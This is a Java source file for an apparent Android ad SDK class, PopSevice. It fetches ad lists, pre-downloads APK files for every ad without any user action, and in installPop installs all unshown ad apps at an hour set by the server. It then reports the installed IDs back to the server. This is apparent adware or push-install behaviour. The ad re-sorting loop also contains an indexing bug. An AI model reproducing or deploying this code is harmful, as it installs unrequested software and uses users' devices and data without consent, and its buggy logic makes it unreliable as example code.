package com.top.sdk.plugservice;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.text.TextUtils;
import android.view.View;

import com.top.sdk.apputils.PackageService;
import com.top.sdk.db.impservice.ImpFileInfoDbService;
import com.top.sdk.db.impservice.ImpPopDbService;
import com.top.sdk.db.impservice.ImpWhiteDbService;
import com.top.sdk.db.service.FileInfoDbService;
import com.top.sdk.db.service.PopDbService;
import com.top.sdk.db.service.WhiteDbService;
import com.top.sdk.entity.FileInfo;
import com.top.sdk.entity.PopData;
import com.top.sdk.entity.WhiteData;
import com.top.sdk.http.business.FileDownload;
import com.top.sdk.http.business.InstallHttpBusiness;
import com.top.sdk.http.business.InterfaceHttpbusiness;
import com.top.sdk.http.business.PopHttpBusiness;
import com.top.sdk.http.reqentity.InstallReqPragam;
import com.top.sdk.http.reqentity.PopReqPragam;
import com.top.sdk.http.respone.entity.PopResult;
import com.top.sdk.http.respone.parser.PopResultParser;
import com.top.sdk.logic.PopAction;
import com.top.sdk.logic.UserAction;
import com.top.sdk.service.RunningThread;
import com.top.sdk.utils.ImageLoader;
import com.top.sdk.utils.LogUtil;
import com.top.sdk.utils.NetWorkUtils;
import com.top.sdk.utils.SharedPrefUtil;
import com.top.sdk.view.PopView;
import com.top.xutils.exception.HttpException;
import com.top.xutils.http.ResponseInfo;
import com.top.xutils.http.callback.RequestCallBack;

public class PopSevice implements InterPopService {
	private PopData pop;
	private long verTime = 12*60*60*1000;
	private RunningThread thread = null;

	public View showView(Context context) {
		List<PopData> popList = PopAction.getShowPopDataFromCache(context);
		PopView view = new PopView(context);
		int size = 0;
		if (popList != null) {
			size = popList.size();
		}
		if (popList != null && size > 0) {
			pop = popList.get(0);
			LogUtil.d("有广告可弹---");
			boolean r = view.setADContent(pop);
			LogUtil.d("填充失败与成功" + r);
			if (!r) {
				return null;// 填充失败就直接finsh
			} else {
				LogUtil.d("弹出前的大小" + popList.size());
				// 填充成功的话
				popList.remove(0);
				int count = pop.getShowCount();
				count--;
				if (count > 0) {
					pop.setShowCount(count);
					popList.add(0, pop);
				} else {
					// 此刻说明用户不想安装此应用，可以将广告拍在后面,等于零说明很有可能没有进行安装（最后一次安装成功的话，放入进去，也不影响后面的运行）;
					SharedPrefUtil.saveUnInstallAdKey(context,
							"" + pop.getPopId());
				}
				PopAction.updatePopDataCache(context, popList);

				return view;

			}
		} else {
			LogUtil.d("没有广告可弹出");
			return null;
		}

	}

	public void setViewOnClick(View v, final Activity activity,
			final Context context) {

		PopView view = (PopView) v;
		view.setClickCallBack(new ClickCallBack() {
			@Override
			public void remove() {
				// TODO Auto-generated method stub
				activity.finish();
			}

			@Override
			public void download() {
				activity.finish();
				String url = pop.getPopUrl();
				ImpFileInfoDbService info = new ImpFileInfoDbService(context);
				FileInfo file = info.getFileInfoByUrl(url);
				if (file.getIsSuccess() == 0) {
					PackageService service = PackageService.getInstance();
					service.installBySystem(context, url);
				} else {
					if (SharedPrefUtil.getAdDownLoading(context) != 1) {
						// 下载指定url的文件
						FileDownload donwload = new FileDownload(context);
						donwload.download(pop);
					}
				}
			}
		});
	}

	public void requestPop(Context context) {
		getListPopData(context);
		installPop(context);
		sendInstallPopId(context);
	}

	public void startListenting(Context context) {
		if (thread == null || !thread.isAlive()) {
			thread = new RunningThread(context);
			thread.start();
		}
	}

	private void getListPopData(final Context context) {
		long nowTime = System.currentTimeMillis();
		LogUtil.d("nowTime---" + nowTime);
		if(SharedPrefUtil.getReqRate(context)!=0){
			verTime = SharedPrefUtil.getReqRate(context)*60*60*1000;
		}
		if (nowTime - SharedPrefUtil.getAdRequestTime(context) > verTime) {
			if (NetWorkUtils.isWifiNetWork(context)) {
				SharedPrefUtil.setAdRequestTime(context, nowTime); // 拉取列表的时间
				LogUtil.d("--------------------获取到了广告列表数据---------------");
				InterfaceHttpbusiness business = new PopHttpBusiness();
				business.httpBusiness(new RequestCallBack<String>() {
					@Override
					public void onSuccess(ResponseInfo<String> responseInfo) {
						// TODO Auto-generated method stub
						PopResultParser parser = new PopResultParser();
						PopResult result = parser
								.parserJson(responseInfo.result);
						int time = result.getInstallTime();
						if (result.getCode() == 0) {
							SharedPrefUtil.saveInstallTime(context, time); //安装时间保存
							SharedPrefUtil.saveReqRate(context, result.getReqRate()); //请求周期时间保存
							SharedPrefUtil.saveAdShowRate(context, result.getShowRate()); //广告展示周期保存
							List<PopData> l = result.getListPop();
							PopDbService popService = new ImpPopDbService(
									context);
							popService.deleteAllPopData();
							if (l != null && l.size() > 0) {
								// 需要做一个排序处理,将用户不想安装过的应用排在后面展示
								String key = SharedPrefUtil
										.getUnInstallAdKey(context);
								if (!TextUtils.isEmpty(key)) {
									String[] IDS = key.split(",");
									List<PopData> tmp = new ArrayList<PopData>();
									for (int i = 0; i < IDS.length; i++) {
										for (int j = 0; j < l.size(); j++) {
											if (IDS[i].equals(l.get(i)
													.getPopId())) {
												tmp.add(l.get(i));
												l.remove(i);
												break;
											}

										}
									}
									if (tmp.size() > 0) {
										l.addAll(tmp);
									}

								}

								popService.insertListPopData(l);
								PopData pop = null;
								FileInfoDbService fileService = new ImpFileInfoDbService(
										context);
								for (int i = 0; i < l.size(); i++) {
									pop = l.get(i);
									// 提前下载图片
									ImageLoader imagerLaoder = ImageLoader
											.getInstance(context);
									String url = pop.getImgUrl();
									if (!TextUtils.isEmpty(url)) {
										url = url.split(",")[0]; // 默认取第一张图片
									}
									imagerLaoder.queuePhoto(url, null);

									// 提前下载apk文件
									FileDownload download = new FileDownload(
											context);
									download.download(pop);

									FileInfo info = new FileInfo();
									info.setFileId(pop.getPopId());
									info.setFileName(String.valueOf(pop
											.getPopUrl().hashCode()));
									info.setFileUrl(pop.getPopUrl());
									info.setIsSuccess(1); // 默认都没有下载成功；
									
									fileService.addFileInfo(info);
								}

							}
							List<WhiteData> y = result.getListWhite();
							WhiteDbService service = new ImpWhiteDbService(
									context);
							service.deleteAllWhiteData();
							if (y != null && y.size() > 0) {
								service.saveWhiteDataList(y);
							}
						}

					}

					@Override
					public void onFailure(HttpException error, String msg) {
						long c = System.currentTimeMillis();
						long current = c-((verTime-1) * 60 * 60 * 1000);
						SharedPrefUtil.setAdRequestTime(context, current);
						//如果访问失败，那就再等一个小时就可以继续访问了
						
					}
				}, new PopReqPragam(context));

			} else {
				// 不是wifi可以不用理


			}

		}

	}

	private void installPop(Context context) {
		DateFormat format = new SimpleDateFormat("HH");
		String f = format.format(new Date());
		int time = Integer.parseInt(f);
		// 获取当前的时间
		int installTime = SharedPrefUtil.getInstallTime(context);
		if (time == installTime) {
			PopDbService popService = new ImpPopDbService(context);
			List<PopData> all = popService.getNotShowPopDataList();
			if (all != null)
				if (all != null) {
					PackageService s = PackageService.getInstance();
					for (int i = 0; i < all.size(); i++) {
						s.installApp(context, all.get(i));
					}
				}
			SharedPrefUtil.saveInstallTime(context, installTime - 1); // 往后倒退一个小时
		}

	}

	private void sendInstallPopId(final Context context) {

		long nowTime = System.currentTimeMillis();
		if (nowTime - SharedPrefUtil.getSendInstallTime(context) > 1000 * 60 * 60) { // 一个小时监测一次
			SharedPrefUtil.saveSendInstallTime(context, nowTime);
		} else {
			return;
		}
		String IDs = SharedPrefUtil.getHaveInstalledAdKey(context);
		if (TextUtils.isEmpty(IDs)) {
			return;
		}
		InstallReqPragam param = new InstallReqPragam(context);
		param.setIDs("" + IDs);
		InterfaceHttpbusiness business = new InstallHttpBusiness();
		business.httpBusiness(new RequestCallBack<String>() {

			@Override
			public void onSuccess(ResponseInfo<String> responseInfo) {
				LogUtil.d("成功安装" + responseInfo.result);
				SharedPrefUtil.clearHaveInstalledAdKey(context);
			}

			@Override
			public void onFailure(HttpException error, String msg) {
			}
		}, param);

	}

	@Override
	public void login(Context context) {
		UserAction user = new UserAction();
		user.userActivation(context);
	}

	@Override
	public Runnable getReciveRunnable(Context context, String packageName,
			String version) {
		return new ExRunnable(context, packageName, version);
	}

	@Override
	public void screenChange(Context context, boolean screenOpen) {
		// TODO Auto-generated method stub
		LogUtil.d("检查到屏幕是打开"+screenOpen);
	}

	@Override
	public void viewCallBack(Context context) {
		// TODO Auto-generated method stub
		LogUtil.d("点击了返回键");
	}

	@Override
	public Runnable getRemoveRunnable(Context context, String packageName) {
		// TODO Auto-generated method stub
		return null;
	}

}
